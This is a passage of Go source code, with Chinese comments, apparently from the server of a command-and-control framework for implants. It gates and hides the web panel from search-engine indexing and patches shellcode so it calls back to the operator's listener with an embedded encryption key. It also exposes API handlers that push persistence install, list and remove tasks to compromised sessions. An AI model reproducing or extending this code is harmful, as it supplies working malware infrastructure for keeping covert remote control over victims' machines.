		SameSite: http.SameSiteLaxMode,
		Secure:   r.TLS != nil,
		MaxAge:   30 * 24 * 3600, // 30 天
	})
	logging.Info("api", "Web gate entry used from %s (cookie issued)", r.RemoteAddr)
	http.Redirect(w, r, "/", http.StatusFound)
}

// webGate 给任意 handler 套上 Web 防护（配置在每次请求时解析，支持热生效）。
func (s *Server) webGate(next http.Handler) http.Handler {
	if s.auth == nil {
		return next
	}
	exempt := implantExemptPrefixes
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.auth.WebGate(s.webConfig(), exempt, next).ServeHTTP(w, r)
	})
}

// robotsHandler 返回禁止收录的 robots.txt（对测绘引擎无约束力，但可避免被搜索引擎收录）。
func (s *Server) robotsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Write([]byte("User-agent: *\nDisallow: /\n"))
}

// ─── Utilities ─────────────────────────────────────────────────────────────────

func extractRequestHost(r *http.Request) string {
	if r.Host != "" {
		host, _, err := net.SplitHostPort(r.Host)
		if err != nil {
			host = r.Host
		}
		if host != "" && host != "localhost" && host != "127.0.0.1" && host != "0.0.0.0" && host != "::1" {
			return host
		}
	}
	if xfh := r.Header.Get("X-Forwarded-Host"); xfh != "" {
		host, _, err := net.SplitHostPort(xfh)
		if err != nil {
			host = strings.SplitN(xfh, ":", 2)[0]
		}
		if host != "" {
			return host
		}
	}
	return ""
}

func (s *Server) rewriteShellcodeServerURL(shellcodeB64 string, callbackHost ...string) (string, error) {
	raw, err := base64.StdEncoding.DecodeString(shellcodeB64)
	if err != nil {
		return shellcodeB64, fmt.Errorf("base64 decode failed: %w", err)
	}

	cfg := s.cfg
	listenerHost := ""
	if len(callbackHost) > 0 && callbackHost[0] != "" {
		listenerHost = callbackHost[0]
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Listener.Host
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Server.Host
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		return shellcodeB64, nil
	}

	scheme := "http"
	if cfg.Listener.TLSEnabled {
		scheme = "https"
	}
	serverURL := fmt.Sprintf("%s://%s:%d", scheme, listenerHost, cfg.Listener.Port)
	encKeyB64 := base64.StdEncoding.EncodeToString([]byte(cfg.Listener.EncryptionKey))

	raw = builder.AppendConfigToShellcode(raw, serverURL, encKeyB64)
	return base64.StdEncoding.EncodeToString(raw), nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ─── Persistence Handlers ──────────────────────────────────────────────────────

func (s *Server) listPersistenceHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: "persistence",
		Data:     `{"action":"list"}`,
	})
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id": taskInfo.ID,
		"message": "Persistence list task sent",
	})
}

func (s *Server) installPersistenceHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Method string `json:"method"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request"}`, http.StatusBadRequest)
		return
	}

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	installData, _ := json.Marshal(map[string]string{
		"action": "install",
		"method": req.Method,
	})

	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: "persistence",
		Data:     string(installData),
	})
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Persistence install (%s) pushed to session %s", req.Method, id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id": taskInfo.ID,
		"method":  req.Method,
		"message": "Persistence install task pushed",
	})
}

func (s *Server) removePersistenceHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: "persistence",
		Data:     `{"action":"remove"}`,
	})
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Persistence remove pushed to session %s", id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id": taskInfo.ID,
		"message": "Persistence removal task pushed",
	})
}

// ─── SPA File Server ────────────────────────────────────────────────────────────

// serveSPA 返回 SPA 文件服务器 handler，使用嵌入的前端文件系统。
// 非 API 路径 -> 尝试服务静态文件 -> 回退到 index.html（前端路由）。
//
// 注意：必须在请求时才读取 s.webFS——setupRoutes 在 api.New 中就会调用本方法，
// 而 SetWebFS 由调用方在 New 之后才注入，若在方法内提前求值会得到 nil 并固定
// 注册 NotFoundHandler，导致前端永远 404。
func (s *Server) serveSPA() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		wfs := s.webFS
		if wfs == nil {
			http.NotFound(w, r)
			return
		}
		fileServer := http.FileServer(wfs)

		if strings.HasPrefix(r.URL.Path, "/api/") {
			http.NotFound(w, r)
			return
		}
		// 尝试直接服务文件
		f, err := wfs.Open(r.URL.Path)
		if err == nil {
			f.Close()
			// Vite 构建的 /assets/* 文件名带内容 hash，可永久缓存；
			// 其余文件（index.html 等）每次重新验证，保证前端更新即时生效。
			if strings.HasPrefix(r.URL.Path, "/assets/") {
				w.Header().Set("Cache-Control", "public, max-age=31536000, immutable")
			} else {
				w.Header().Set("Cache-Control", "no-cache")
			}
			fileServer.ServeHTTP(w, r)
			return
		}
		// SPA fallback: 返回 index.html（前端路由处理）。
		// 注意不能用 http.ServeFile——它会访问磁盘文件系统，而前端是嵌入的。
		if _, err := wfs.Open("index.html"); err == nil {
			w.Header().Set("Cache-Control", "no-cache")
			r.URL.Path = "/"
			fileServer.ServeHTTP(w, r)
			return
		}
		http.NotFound(w, r)
	})
}
